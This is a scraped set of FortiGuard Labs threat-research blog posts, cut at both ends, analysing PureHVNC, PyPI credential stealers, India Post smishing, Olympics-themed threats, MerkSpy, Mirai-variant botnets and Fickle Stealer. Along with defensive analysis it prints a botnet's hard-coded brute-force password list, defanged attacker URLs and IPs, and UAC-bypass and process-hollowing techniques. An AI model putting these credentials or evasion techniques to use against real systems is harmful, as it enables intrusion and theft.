list specifically targets crypto wallets, password managers, two-factor authenticators, and popular communication programs. After all the specified information is collected, it is sent to the C2 server to await further plugin loading. Figure 20 illustrates a method for handling incoming data from the C2 server after it has been preprocessed using gunzip and deserialization. When the program receives the plugin, it writes the plugin data and ID into the Windows Registry under the affected user’s HKEY_CURRENT_USER\\Software\\{VictimID}. The plugin data is then extracted, loaded into memory, and executed. Our analysis identified some details that helped us pinpoint the malware family. The same information appeared in the subsequently downloaded plugin, as seen below. In the following sections, we’ll elaborate on the plugins provided by the PureHVNC C2 server, which are obfuscated using the .NET Reactor. The initial plugin we received from the threat actor is a DLL file named “PluginRemoteDesktop.” As Figure 22 shows, its entry method is executed with the binary as a parameter to provide the module with C2 information. After extracting the C2 details, it communicates with the C2 server and executes the Remote Desktop function. Figure 23 shows one of the mouse-controlled functions and the APIs used by the RemoteDesktop program. PluginExecuting is a module responsible for executing additional files, updating the program, and even uninstalling malware. It follows a process similar to that of PluginRemoteDesktop at the entry point, using the C2 information extracted from parameters to communicate with the C2 server. It then waits to receive a packet to trigger the execution of the core function. The core function acts as a handler to process different commands based on their type. It supports six types of command, as illustrated in Table 1. Command Details DownloadAndExecuteDisk Execute a downloaded file DownloadAndUpdate Remove the current module and execute the downloaded file. UninstallConnection Delete the registry entry HKEY_CURRENT_USER\\Software\\{VictimID}, and remove the malware if it is not located in the %WINDOWS% folder. RestartConnection Start a new instance of the current module and terminate the existing process. CloseConnection Terminate the current process. DownloadAndExecuteMemory Run the downloaded payload in the designated process. Table 1: Commands PluginExecuting contains several important commands, particularly those related to downloading. Figure 24 illustrates the command used to create a hidden process that executes the downloaded file. These commands combine with a batch file to achieve both file deletion and execution, as shown in Figure 25. Additionally, theDownloadAndExecuteMemorycommand requires a binary and a target name as parameters. It injects the malicious binary into a specified target process using process hollowing and then resumes the injected process to execute the malicious code. Deploying multiple types of malware in an attack campaign is not unusual. In this case, the threat actor also uses complex, multilayer encryption to avoid detection across all the malware used in this campaign. In this article, we uncovered a phishing campaign targeting employees that employs a multi-stage execution flow and utilizes public hacking tools to evade detection. We also focused on one obfuscated payload, \"PureHVNC,\" detailing its functions and the additional plugins collected. Our observations indicate that it targets crypto wallets, password managers, and 2FA authenticators. Finally, it can carry out further attacks using its RemoteDesktop and Executing plugins.

    "title": "Malicious Packages Hidden in PyPI",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-packages-hidden-in-pypl",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High The FortiGuard Labs team has identified a malicious PyPI package affecting all platforms where PyPI packages can be installed. This discovery poses a significant risk to individuals and institutions that have installed these packages, potentially leading to the leakage of credentials and sensitive information. Given the high severity of this threat, it is crucial to focus on this specific PyPI package. This report discusses its potential impacts and emphasizes the importance of diligent security practices in managing software dependencies. On July 3, the Fortinet AI-driven OSS malware detection system identified a malicious package named zlibxjson version 8.2, published on June 29, 2024. This package contained a malicious URL that downloaded various files, including an executable (.exe) file packed with PyInstaller. The .exe file was unpacked to retrieve .pyc files, which were then decompiled into Python (.py) files. Among the numerous Python and DLL files discovered, three were particularly problematic: Discord_token_grabber.pyget_cookies.pypassword_grabber.py. These files are designed to steal sensitive information, such as Discord tokens, browser cookies, and stored passwords. We examine each of these files in the following sections. The provided code is malicious for several reasons, but primarily because it aims to steal sensitive information from Discord users and send it to an external server controlled by the attacker. 1. Token Extraction: The code extracts Discord tokens from the user's local machine by searching for patterns that match token formats in local files. Tokens are used to authenticate users with Discord’s API. Stealing these tokens allows an attacker to gain unauthorized access to the victim's Discord account. The class `extract_tokens` performs this search in local application data directories using regular expressions. The tokens are then validated and decrypted if necessary. 2. Decryption of Stored Data: The code includes functionality to decrypt stored passwords and tokens using the system's master key. This allows the attacker to access sensitive data stored securely by the system. 3. Data Exfiltration: The code sends the extracted tokens and other user information to the attacker's server by making HTTP requests to Discord's API endpoints. It gathers user profile information, billing details, guild memberships, and gift codes. The collected data is then formatted and sent to an external server, enabling the attacker to use or sell the stolen information. The `fetch_tokens` class collects this wide range of information using the stolen tokens. 4. Persistence and Evasion: The code includes retry mechanisms and various methods to ensure it can continue its operations even if some attempts fail. The collected data is then formatted and sent to an external server or presented in a format that can be easily sent to the attacker. This file includes some critical malicious activities, including cookies theft, decryption of stored data, and data exfiltration, 1. Cookie Theft: The code's primary purpose is to steal cookies from various web browsers, such as Chrome, Firefox, Brave, and Opera. Cookies often contain sensitive information like session tokens, login credentials, and other personal data. The code also accesses and copies browser data directories without user consent, indicating a clear malicious intent. 2. Decryption of Stored Data: The code decrypts stored cookies using the system's master key, which is extracted from the browser's local state files. This involves decrypting data that is typically securely stored. It unlocks encrypted cookie data, bypassing security mechanisms that protect user information. 3. Data Exfiltration: The decrypted cookies are saved to a file named `cookies.txt` located in the user's directory (`C:\\\\Users\\\\{getuser()}\\\\cookies.txt`), a tactic commonly used to collect and later exfiltrate sensitive data. This indicates an intent to gather and potentially transfer sensitive information. Additionally, the code creates temporary directories and files, possibly to hide its activities and ensure persistence. The provided code is malicious. It is designed to steal saved passwords from web browsers, specifically Google Chrome and Microsoft Edge, and decrypt them for unauthorized access. Here's a detailed analysis of why this code is malicious: Detailed Analysis: The functions `get_passwords_edge()` and `main()` access the databases where Chrome and Edge store login data to extract encrypted passwords. The code copies the `Login Data` file used by Chrome and Edge to a local file (`ChromeData.db`) to read its contents without locking issues. After extracting the encrypted passwords, the code decrypts them using the browser's encryption key. The extracted and decrypted data, including URLs, usernames, and passwords, are stored in a dictionary that can be sent to an attacker or saved for misuse. The code then removes the copied database file to clean up traces. Specific malicious elements include unauthorized access to browser data directories, decryption of sensitive data, and the potential exfiltration of collected passwords to an external server or attacker-controlled location. The identified malicious packages in PyPI are designed to steal sensitive information by accessing and decrypting stored data from web browsers, such as passwords and cookies. These actions can lead to unauthorized access to user accounts and the exfiltration of personal data, clearly classifying the software as malicious. It is crucial to remain vigilant and use detection systems like AI-driven OSS malware detection to identify and mitigate such threats, ensuring user privacy and security are maintained.

    "link": "https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-mobile-users-in-india-using-india-post-lures",
    "content": "FortiGuard Labs Threat Research Impacted Users:iPhone users in IndiaImpact:Possible financial loss; stolen information can be used for future attacksSeverity Level:Medium The FortiGuard Labs Threat Research team recently observed a number of social media posts commenting on a fraud campaign targeting India Post users. India Post is India’s government-operated postal system. It is part of the Ministry of Communications and has a vast network of over 150,000 post offices across the country, making it one of the largest postal systems in the world. In this campaign, iPhone users are being targeted by smishing attacks claiming to be from India Post. This scam involves sending an iMessage to iPhone users that falsely claims that a package is waiting at an India Post warehouse. Publicreportingsuggests this campaign is being attributed to a China-based threat actor known as theSmishing Triad. This group has previously targeted other regions, including the US, UK, EU, UAE, KSA, and, most recently, Pakistan. We have observed third-party email addresses such as Hotmail, Gmail, or Yahoo being used in phishing emails on iMessage. Apple allows users to create an Apple ID using these third-party email addresses as the primary email associated with their Apple ID. Once the Apple ID is created and configured for iMessage, the sender can use that third-party email address to send messages through iMessage. The messages often contain a short URL, leading to a fraudulent website. Upon investigation, we discovered a significant number of newly registered domains being used for current and potential phishing scams. This blog highlights the tools and methods used to propagate such phishing campaigns and explores the scale of these operations, the tactics employed by threat actors, and other relevant insights. Between January and July 2024, we found over 470 domain registrations mimicking India Post's official domain. Among these, 296 domains were registered via the Chinese registrarBeijing Lanhai Jiye Technology Co., Ltd.,followed by 152 registrations through Namesilo, an American domain registrar. The notable concentration of registrations through a Chinese registrar certainly raises substantial concerns about the underlying intentions. This activity exemplifies ahomograph phishing attack, where domain names are created to look visually similar to legitimate ones. The most frequently used top-level domains (TLDs) include 'vip' (200 registrations), 'top' (81 registrations), and 'buzz' (40 registrations). The registration cost per domain varies: 'vip' TLDs typically range from USD 4 to USD 5 per domain, whereas 'top' TLDs cost between USD 1 and USD 2 per domain. To calculate the total investment: Our analysis revealed that Tencent, a Chinese hosting service provider, hosts a significant number of these domains (232). Additionally, Tencent hosts 16 domains registered in Santa Clara. Further analysis revealed that 262 domain names point to the IP address 119.28.68[.]187, also hosted onTencent's servers. When investigating the phishing domain 'indiapost[.]top,' which impersonates India Post through a cloned copy of the original website, it was discovered that the domain does not host any content. Instead, specific paths on the domain are utilized to host the phishing website that impersonates India Post. While the domain name was registered on 28th November 2023, it is now actively being used in their operations. It is now likely to evade detection by antivirus engines as domains typically gain reputation over time. The phishing site (on the left) is an identical copy of the original India Post website (on the right). Continuing as a regular user, the fraudsters collect sensitive information such as name, full residential address, email ID, and phone number. This information can be leveraged in future operations for further scams, sending phishing emails, spreading disinformation/misinformation, or distributing malware. On the next page, the fraudulent site requests debit/credit card information for a payment of INR 25.02, claiming it is a charge for redelivering the package. The threat actors begin by sending a message via iMessage directly to the recipients' registered Apple ID email addresses. The sender ID could be a newly registered Apple ID or a compromised account. This method ensures that the message appears within the recipient's Messages app as an iMessage, distinct from traditional email communications, provided both parties use iMessage-enabled devices and have their Apple IDs configured for iMessage. The investment in registering these domain names alone exceeds USD 1500, not to mention additional costs for hosting and development. This significant investment highlights the threat actors' commitment, the phishing operation's scale, and its potential long-term impact. As a result, we feel that the likelihood of numerous victims falling prey to these scams is increased, leading to substantial financial losses, data breaches, and other security issues for individuals and organizations targeted by these domains. This operation may also serve as a strategic initiative to raise funds to fuel operations in China. Because of this, awareness and proactive measures are crucial to mitigating the risks posed by these phishing activities.

    "link": "https://www.fortinet.com/blog/threat-research/dark-web-shows-cybercriminals-ready-for-olympics",
    "content": "FortiGuard Labs Threat Research Major sporting events like the World Cup, Super Bowl, and Wimbledon attract millions, even billions, of viewers. Argentina’s shootout win over France in the final game of the Qatar 2022 World Cup reached a global audience of 1.5 billion viewers. And the Olympics, starting later this month in Paris, is the biggest of them all—with the 2020 Tokyo Olympics having attracted a worldwide audience of over 3 billion viewers. These events are also prime opportunities for cybercriminals. Over the past decade, the number of cyberattacks targeting major events has surged, increasing from 212 million documented attacks at the London 2012 Games to a staggering 4.4 billion at the Tokyo 2020 Games. These attacks often have direct financial motives, such as scams, digital fraud, or the acquisition of valuable data from attendees, viewers, and sponsors. In their excitement, eager fans often overlook potential risks when purchasing tickets, arranging accommodations, or buying memorabilia, making them easy targets for cybercriminals. Others, desperate to view specific events, are enticed by malicious websites offering free access, only to have their devices compromised or personal data stolen. And with the world’s media focused on the event, criminals with a political agenda are looking for a large audience for their message by disrupting a significant site or knocking critical services offline. According to a new FortiGuard Labs analysis based on threat intelligence provided byFortiRecon, this year’s Olympics have been a target for a growing number of cybercriminals for over a year. Using publicly available information and proprietary analysis, this report provides a comprehensive view of planned attacks, such as third-party breaches, infostealers, phishing, and malware, including ransomware. To download the full FortiGuard Labs report, visithere. FortiGuard Labs has observed a significant increase in resources being gathered for the Paris Olympic Games, especially those targeting French-speaking users, French government agencies and businesses, and French infrastructure providers. Beginning the second half of 2023, we saw a surge in darknet activity targeting France. This 80% to 90% increase has remained consistent across 2H 2023 and 1H 2024. The prevalence and sophistication of these threats are a testament to cybercriminals’ planning and execution, with the dark web serving as a hub for their activities. Documented activities include the growing availability of advanced tools and services designed to accelerate data breaches and gather personally identifiable information (PII), the sale of stolen credentials and compromised VPN connections to enable unauthorized access to private networks, and advertisements for phishing kits and exploit tools customized for the Paris Olympics. It also includes the sale of French databases that contain sensitive personal information, such as full names, dates of birth, government identification numbers, email addresses, phone numbers, residential addresses, and other PII, as well as combo lists (a collection of compromised usernames and passwords used for automated brute-force attacks) composed of French citizens. Given that Russia and Belarus are not invited to this year’s games, we have also seen a spike in hacktivist activity by pro-Russian groups—like LulzSec, noname057(16), Cyber Army Russia Reborn, Cyber Dragon, and Dragonforce—that specifically call out that they’re targeting the Olympic games. Groups from other countries and regions are also prevalent, including Anonymous Sudan (Sudan), Gamesia Team (Indonesia), Turk Hack Team (Turkey), and Team Anon Force (India). Phishing kits:While phishing is perhaps the easiest form of attack, many low-sophistication cybercriminals don’t know how to create or distribute phishing emails. Phishing kits provide novice attackers with a simple user interface that helps them compose a convincing email, add a malicious payload, create a phishing domain, and procure a list of potential victims. The addition of text-generating AI services has also eliminated the spelling, grammatical, and graphical errors that allow recipients to detect an email as malicious. The FortiGuard Labs team has also documented a significant number of typosquatting domains registered around the Olympics, including variations on the name (oympics[.]com, olmpics[.]com, olimpics[.]com, and others). These are combined with cloned versions of the official ticket website that take you to a payment method where you don’t get a ticket, and your money is gone. In collaboration with Olympic partners, the French Gendarmerie Nationale hasidentified 338 fraudulent websitesclaiming to sell Olympic tickets. According to their data, 51 sites have been shut down, and 140 have received formal notices from law enforcement. Similarly, several Olympic Games–themed lottery scams have been identified, with many impersonating major brands such as Coca-Cola, Microsoft, Google, the Turkish National Lottery, and the World Bank. The primary targets for these lottery scams are users in the U.S., Japan, Germany, France, Australia, the U.K., and Slovakia. We have also seen an increase in coding services for creating phishing websites and associated live panels, bulk SMS services to enable mass communication, and phone number spoofing services. These offerings can facilitate phishing attacks, spread misinformation, and disrupt communications by impersonating trusted sources, potentially causing significant operational and security challenges during the event. Infostealers:Information stealer malware is designed to stealthily infiltrate a victim’s computer or device and harvest sensitive information, such as login credentials, credit card details, and other personal data. We have also observed that threat actors are deploying various types of stealer malware to infect user systems and obtain unauthorized access. Threat actors and initial access brokers can further leverage this information to execute ransomware attacks, causing substantial harm and financial loss to individuals and organizations. Our data indicates that Raccoon is currently the most active infostealer in France, accounting for 59% of all detections. Raccoon is an effective and inexpensive Malware-as-a-Service (MaaS) sold on dark web forums. It steals browser autofill passwords, history, cookies, credit cards, usernames, passwords, cryptocurrency wallets, and other sensitive data. It is followed by Lumma (another subscription-based MaaS) at 21% and Vidar at 9%. In addition to celebrating athleticism and sportsmanship, the Paris Olympics 2024 is a high-stakes cyberthreat target, drawing attention from cybercriminals, hacktivists, and state-sponsored actors. Cybercriminals are leveraging phishing scams and fraudulent schemes to exploit unsuspecting participants and spectators. Fake ticketing platforms, fraudulent merchandise, and identity theft tactics threaten financial loss and undermine public trust in event-related transactions. Further, due to France’s political stances and international influence, the Paris Olympics 2024 is also a prime target for politically motivated groups. We anticipate that hacktivist groups will focus on entities associated with the Paris Olympics to disrupt the event, targeting infrastructure, media channels, and affiliated organizations to disrupt event proceedings, undermine credibility, and amplify their messages on a global stage. To learn more about FortiRecon and generating reports like this for your organization,visit here. Organizations and individuals attending the Olympic Games need to be aware of heightened travel-related cyberthreats. These include the increased likelihood of public Wi-Fi interception and fraudulent activities linked to Olympics-related events, including malicious websites and phishing scams. We also anticipate increased targeted attacks against VIPs, including government officials, senior executives, and key decision-makers, and additional precautions should be taken. FortiGuard Labs strongly recommends installing endpoint protection or EDR on all devices, taking extra care when connecting to public wireless networks, and using SASE services to encrypt traffic. Major events like the Olympics are good reminders that we all need to remain vigilant against cyberthreats.

    "link": "https://www.fortinet.com/blog/threat-research/merkspy-exploiting-cve-2021-40444-to-infiltrate-systems",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Spyware is malicious software engineered to covertly monitor and gather information from a user’s computer without their awareness or consent. It can record activities like keystrokes, browsing behavior, and personal information, often transmitting this data to a third party for espionage or theft. FortiGuard Labs recently detected an attack exploiting the CVE-2021-40444 vulnerability in Microsoft Office. This flaw allows attackers to execute malicious code via specially crafted documents. In this instance, the exploitation led to the deployment of a spyware payload known as “MerkSpy.” MerkSpy is designed to clandestinely monitor user activities, capture sensitive information, and establish persistence on compromised systems. This blog will dissect the stages of this complex attack, offering insights into the techniques used by cybercriminals to infiltrate systems and steal sensitive data. The initial vector for this attack is a deceptive Microsoft Word document posing as a job description for a software developer position. Opening the document triggers the exploitation of CVE-2021-40444, a remote code execution vulnerability within the MSHTML component used by Internet Explorer in Microsoft Office. This vulnerability permits an attacker to execute arbitrary code on a victim’s machine without additional user interaction beyond opening the document. The attacker conceals the URL within the “\\_rels\\document.xml” file. It directs to hxxp://45[.]89[.]53[.]46/google/olerender[.]html, downloading an HTML file that sets the stage for the next phase of the attack. After the successful exploitation, the malicious document initiates the downloaded payload, “olerender.html,” from a remote server. This HTML file is strategically crafted, with innocuous script filling the beginning to mask its true intent. The end of the file conceals the shellcode and injection process, which propels the attack forward when executed on the victim’s machine. “olerender.html” first checks the system’s OS version. If it detects an X64 architecture, it extracts the embedded “sc_x64” shellcode. After determining the OS version and extracting the appropriate shellcode, “olerender.html” locates and retrieves the Windows APIs “VirtualProtect” and “CreateThread.” These functions are crucial for the following steps: it leverages “VirtualProtect” to modify memory permissions, allowing the decoded shellcode to be written into memory securely. Following this, “CreateThread” executes the injected shellcode, setting the stage for downloading and executing the next payload from the attacker’s server. This process ensures that the malicious code runs seamlessly, facilitating further exploitation. Once the shellcode is in place, it functions as a downloader, initiating the next phase of the attack. It reaches out to the same remote server to fetch a file, deceptively named “GoogleUpdate.” Despite its seemingly innocuous name, “GoogleUpdate” is far from benign. This file harbors the core malicious payload, which is deeply encoded to evade detection by standard security measures. Upon successful download, the shellcode meticulously decodes and prepares this payload for execution. Once “GoogleUpdate” is downloaded, the shellcode decodes the file using an XOR key of 0x25021420 and an increment value of 0x00890518. This decryption process is crucial as it extracts the concealed actual payload embedded within the file. By employing these specific cryptographic techniques, the shellcode ensures that the malicious content remains hidden, allowing the attacker to execute their intended operations on the compromised system effectively. The extracted payload is protected with VMProtect. Its primary function is seamlessly injecting the MerkSpy spyware into crucial system processes. MerkSpy spyware operates covertly within a system, enabling it to capture sensitive information, monitor user activities, and exfiltrate data to remote servers controlled by malicious actors. MerkSpy achieves persistence by masquerading as “Google Update,” adding a registry entry for “GoogleUpdate.exe” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” This deceptive tactic ensures that MerkSpy launches automatically at system startup, enabling continuous operation and data exfiltration without the user’s knowledge or consent. Following its installation, MerkSpy initiates the exfiltration process and begins monitoring specific targets: capturing screenshots, logging keystrokes, retrieving Chrome login credentials, and accessing the MetaMask extension. Once it gathers this data, MerkSpy uploads the collected information to the attacker’s server through the URL hxxp://45[.]89[.]53[.]46/google/update[.]php. The POST request employs a user agent string of “WINDOWS” and uses a fixed boundary, “---------------------------update request,” indicating it is a multi-part form-data submission. The request body is comprised of multiple parts: Based on telemetry from the C2 server at “45[.]89[.]53[.]46,” a significant activity spike began at the end of May, primarily targeting North America and India. The initial phase of the attack leverages a vulnerability in the MSHTML component used by Internet Explorer. Upon exploitation, it initiates the download of a file named “olerender.html,” which contains JavaScript and embedded shellcode. This shellcode decodes the downloaded content to execute an injector responsible for loading the MerkSpy spyware into memory and integrating it with active system processes. MerkSpy is capable of sophisticated surveillance activities, including keystroke logging, screenshot capture, and harvesting Chrome browser login data.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Linux DistributionsImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Cybersecurity threats are increasingly leveraging cloud services to store, distribute, and establish command and control (C2) servers, such asVCRUMSstored on AWS orSYK Crypterdistributed via DriveHQ. This shift in strategy presents significant challenges for detection and prevention, as cloud services provide scalability, anonymity, and resilience that traditional hosting methods lack. Over the past month, FortiGuard Labs has been monitoring botnets that have adopted this strategy, abusing cloud services to enhance their malicious capabilities. These botnets, such as UNSTABLE and Condi, have been observed leveraging cloud storage and computing services operators to distribute malware payloads and updates to a broad range of devices. Using cloud servers for C2 operations ensures persistent communication with compromised devices, making it harder for defenders to disrupt an attack. We have also observed a threat actor exploiting multiple vulnerabilities to target JAWS webservers, Dasan GPON home routers, Huawei HG532 routers, TP-Link Archer AX21, and Ivanti Connect Secure to amplify their attacks. In this article, we will detail this threat actor's initial attack method and further explore the botnets being used. Initial access by the UNSTABLE Botnet targets the JAWS Webserver RCE vulnerability, CVE-2016-20016, and retrieves the downloader script “jaws” from 45[.]128[.]232[.]15. It includes multiple binary files for 13 architectures executed using the parameter “jaws.exploit.” The UNSTABLE Botnet is a Mirai variant that uses XOR to encode its configuration. It has three main modules: exploitation, scanner, and DDoS attack. The exploitation module targets three vulnerabilities: CVE-2016-20016, CVE-2018-10561/10562, and CVE-2017-17215. The scanner module includes a hard-coded list of usernames and passwords that it uses for brute-force scanning of other endpoints in the network. root Zte521 swsbzkgn taZz@23495859 grouter juantech tsgoingon telnet pass solokey oelinux123 password admin tl789 svgodie default GM8182 t0talc0ntr0l4! user hunt5759 zhongxing guest telecomadmin zlxx. telnetadmin twe8ehome zsun1188 1111 h3c xmhdipc 12345 nmgx_wapia klv123 123456 private hi3518 54321 abc123 7ujMko0vizxv 88888888 ROOT500 7ujMko0admin 20080826 ahetzip8 dreambox 666666 anko system 888888 ascend iwkb 1001chin blender realtek xc3511 cat1029 00000000 vizxv changeme 12341234 5up iDirect huigu309 jvbzd nflection win1dows hg2x0 ipcam_rt5350 antslq Figure 5: Scanner module and hard-coded username/password The DDoS attack module is a typical list that covers several protocols. The UNSTABLE botnet contains nine methods: attack_tcp_ack, attack_tcp_syn, attack_tcp_legit, attack_tcp_sack2, attack_udp_plain, attack_udp_vse, attack_udp_thread, attack_gre_ip, and attack_method_nudp. The botnets can choose the appropriate method based on commands from its C2 server. FortiGuard Labspreviously disclosedthe Condi DDoS botnet, which continues to exploit CVE-2023-1389 to gain control of devices and execute its malicious activities. The binary file is hosted on “45[.]128[.]232[.]90” for distribution. Once a device is infected, the malware kills off the competition and specific processes. It then sets up a connection to a central Command and Control (C2) server, “trembolone[.]zapto[.]org.” FortiGuard Labs noticed the incident as the payload “ping -c 20 209.141.35.56,” which seemed unusual within such an attack. Since the IP address is neither the attack source nor the destination intranet, we suppose these two IP addresses, 45[.]128[.]232[.]229 and 209[.]141[.]35[.]56, might be controlled by the attacker simultaneously and one of them is a command and control (C2) server. The attack source IP address, “45[.]128[.]232[.]229,” has four files named “msgbox.exe,” “udp,” “udparm,” and “udpmips,” respectively. These are DoS tools for different Linux architectures, except “msgbox.exe,” which pops up a message box with the string “RAT.” The following analysis examines the “udp” file. The tool has an unmistakable usage message, “Usage: %s <IP> <SECONDS> [PORT],” while executing without any arguments. When executing with the necessary “IP” and “SECONDS” arguments, the tool triggers a UDP flooding DoS attack using system-generated random characters. The IP address “209[.]141[.]35[.]56” pinged by the compromised device is exploited by the attack source IP address “45[.]128[.]232[.]229” using the CVE-2023-1389 vulnerability. It was first met with a page that the FBI has seized due to its use as a DDoS service (Figure 12). However, FortiGuard Labs found the IP address also has another route, “hxxp://209[.]141[.]35[.]56/getters/,” which contains 19 malware variants for different Linux architectures. (see Figure 13) aarch64 microblazebe aarch64be microblazeel arcle-750d mips arcle-hs38 mipsel armv4l nios2 armv5l openrisc armv6l powerpc armv7l riscv64 i586 sh4 m68k sparc m68k-68xxx x86_64-core-i7 m68k-coldfire x86-core2 m68k-coldfire.gdb x86-i686 xtensa-lx60 Figure 13: The malware for different Linux architectures We focus on analyzing the file for architecture “x86-i686.” The malware creates a socket and checks whether the C2 server is valid. If not, it terminates the program. If the server is confirmed reachable, the malware sets up a connection with C2 server “45[.]128[.]232[.]229,” which is the exploit CVE-2023-1389 source IP address, executes the “ps” command, and gathers process-related output information. The malware executes the command “ps -eo pid,comm --no-headers” through “/bin/bash” to get all process PIDs (Process IDs) and command names running without a header line. It then leverages the obtained PIDs (Process IDs) to further check the commands of those executing processes using “/proc/<PID>/comm.” Afterward, the malware sends related information to the C2 server. According to our analysis, the attackers seem to have a cloud command and control (C2) server (45[.]128[.]232[.]229) and a network-attached malware storage (209[.]141[.]35[.]56). The attacker first checks to see if the leveraged device can reach the network-attached malware storage to download malware and execute the following attack stages. This malware, which we named “Skibidi,” was spread by the attacker using two different vulnerabilities simultaneously. One is CVE-2023-1389 in TP-Link Archer AX21, which botnets have continuously exploited since it was launched, asdetailed in the reportproduced by FortiGuard Lab. The other is CVE-2024-21887 in Ivanti Connect Secure, which caused a sensation in April 2024. Attackers first download the “Skibidi” malware with a downloader script. It downloads and executes each malware to determine the proper Linux architecture attack. arm4 mips arm5 mipsel arm6 ppc arm7 sh4 x86_64 Figure 21: The malware targets Linux architectures The following analysis is based on the malware “skibidi.x86_64.” While executing the malware, it displays the string “youre not skibidi enough.” It then calls the Linux function “ptrace” to handle the process on the victim host. The malware sends signals like a debugger to the sub-program, the malware itself, to fork another process to evade detection. The malware then decodes strings encoded by XOR for the behaviors creating process and popping up execution result string. It calls the system function “prctl,” which manipulates the calling process by naming it with the XOR-encoded strings “-bash” and “x86_64.” Afterward, the malware tries to connect with its C2 server through a socket. Meanwhile, it uses the system call “select” to listen to the events of files the attacker is interested in, such as process events. The malware repeats these steps of listening to events and sends the results back to the server. Cloud services' inherent flexibility and efficiency have unwittingly provided cybercriminals with a new arena for their activities. This shift to cloud-based operations marks a significant evolution in the threat landscape, with malware operators exploiting these platforms' advantages. Organizations must bolster their cloud security defenses as botnets and DDoS tools continue to leverage cloud services. Robust security measures and vigilant monitoring within cloud environments are imperative to combat these sophisticated attacks. Implementing a multi-layered security approach, including regular patching, updates, and network segmentation, is essential to isolate critical assets and mitigate potential breaches.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High The past few years have seen a significant increase in the number of Rust developers. Rust is a programming language focused on performance and reliability. However, for an attacker, its complicated assembly code is a significant merit. In May 2024, FortiGuard Labs observed a Rust-based stealer. In addition to its intricate code, the stealer is distributed using a variety of strategies and has a flexible way of choosing its target. Because of this ambiguity, we decided to call it Fickle Stealer. This article summarizes the details of this campaign, roughly dividing the attack chain into three stages: Delivery, Preparatory Work, and Packer and Stealer Payload. We are aware of four methods being used to deliver Fickle Stealer: VBA dropper, VBA downloader, link downloader, and executable downloader. For the most part, they download a PowerShell script for preparatory work. The file name is u.ps1 or bypass.ps1—they indicate the same file. In some attack chains, one more file is added between the downloader and u.ps1 The script in the XML file drops Fickle Stealer to the Temp folder and executes it. The second VBA downloader uses forfiles.exe to subvert detections that limit cmd usage. The third downloader uses a trick to indirectly deliver the VBA downloader. In the document, a web browser control that accesses an MSHTML file on the server is embedded in a frame. When the victim enables active content and macro, it reads the MSHTML file and extracts the command from the file. Usually, the WebBrowser.Navigate method is necessary to load a specified URL. However, Word stores the last loaded URL in the document file, and that URL is used if a new one is not provided. In other words, once the URL is loaded, it can be loaded in the next execution even though there is no related macro. Another variant uses this technique to hide the URL (8d3ccfafc39830ee2325170e60a44eca4a24c9c4dd682a84fa60c961a0712316). This section introduces the script files used in this attack. Normal: C:\\Windows \\System32 Fake: C:\\Windows \\System32\\en-US An MSC file, hosted in Microsoft Management Console (MMC), manages the hardware, software, and network components and requires admin rights. Snap-ins provide the interface to the management task and access to the required program and data. The fake WmiMgmt.msc abuses a Shockwave Flash Object from ActiveX control, which opens a web browser by default. The URL for the web browser is set to localhost, and u.ps1 creates HttpListener, which shows a web page when WmiMgmt.msc is executed. The web page contains a script that configures exclusions for Fickle Stealer and then downloads it to be executed. The file path uses a technique called the Mock Trusted Directories Method. When converting a string during an evaluation request process, the trailing space after “Windows” is removed. As a result, the WmiMgmt.msc will be treated as executed from a trusted path. Furthermore, MMC searches the MSC file for local languages. If not found, it tries to find one for en-US, so when Fickle Stealer executes WmiMgmt.msc’s copy, the fake WmiMgmt.msc is executed instead, with elevated authentication and no UAC prompt pops up. Besides the message, tgmes.ps1 sends victim information, including country, city, IP address, OS version, computer name, and user name to the Telegram bot. Fickle Stealer is protected by a packer disguised as a legal executable. It seems that the attacker made the packer by replacing some code of a legal executable with the packer’s code and changing a function called in the initialize routine into the packer’s function. This can frustrate the static analysis. Mimicking various applications makes it difficult to detect the malware using certain detection rules. For example, there is a variant (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53) whose__cinitfunction in the initialize routine is modified into the packer’s function. In this case, the malicious code is executed before the WinMain function, which is usually the user-provided entry point for a C/C++ GUI application. As a result, people following typical analysis rules may overlook the malicious code. The packer only allocates memory to write the decrypted payload data and then executes it in memory. Initially, Fickle Stealer creates a mutex to prevent a race condition. It then performs a series of anti-analysis checks and exits the process while it is being analyzed. Generally, it shows a fake error message before terminating the process.

Next, it creates a new folder in the Temp folder with a random name, drops its copy to the new folder, and executes the copy. The currently running stealer will be terminated, and the copy will finish the remaining work to communicate with the server and send stolen data to the server. If the environment check is passed, Fickle Stealer sends victim information to the server. The server sends a list of target applications and keywords as a response. Fickle Stealer sends all files in folders according to the list. The stolen data is stored in a specific JSON format that has three key-value pairs: { \"name\": \"RB_{Computer name}\",\"title\": {File name},\"body\": {File content} } In this sample, its name contains a string RB and the name of the victim’s computer. In version 1.5.7 (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53), the string “RB” is changed to “Hold.” The title indicates the data it grabs. It usually contains a tag followed by a file path. The body is base64-encoded file content. After being compressed with the Deflate algorithm, the JSON-formatted data is sent to the server. There are some exceptions. For example, the first packet sent to the server contains the following items, and the title is System.txt. user name, user domain, DNS host name, NetBIOS name, screen resolution, OS version, language, host name, ip address and hardware information: CPU, GPU, Antivirus software, installed application and currently running process The server's response is also in JSON format and has three key-value pairs: status, k, and c. The target list, encrypted using an RC4 algorithm and then base64 encoded, is stored in c. The decryption key for RC4 is stored in k, as the following image shows. There are four kinds of targets: crypto wallets, plugins, file extensions, and partial paths. Below are the targets specified by the server and the way the data is processed: Wallet Sends files in specified folders. The title of data to send has a “wallet::” tag. AtomicWallet, Exodus, JaxxWallet, Electrum, ByteCoin, Ethereum, Guarda, Coinomi, Armory, ZCash Plugin Sends files in specified folders. The title of data to send has a “plugin___” tag. Authenticator, EOSAuthenticator, Bitwarden, KeePassXC, Dashlane, 1Password, NordPass, Keeper, RoboForm, 